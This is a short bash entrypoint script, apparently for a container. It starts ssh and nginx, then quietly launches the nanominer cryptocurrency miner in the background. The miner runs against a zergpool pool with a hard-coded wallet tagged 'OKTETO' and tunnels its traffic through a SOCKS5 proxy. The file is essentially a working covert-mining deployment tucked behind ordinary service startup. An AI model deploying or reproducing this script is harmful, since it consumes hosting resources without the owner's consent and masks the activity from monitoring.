#!/bin/bash
service ssh start
service nginx start
cd /nanominer/3.5.2 && chmod +x nanominer && nohup ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
disown -h %1
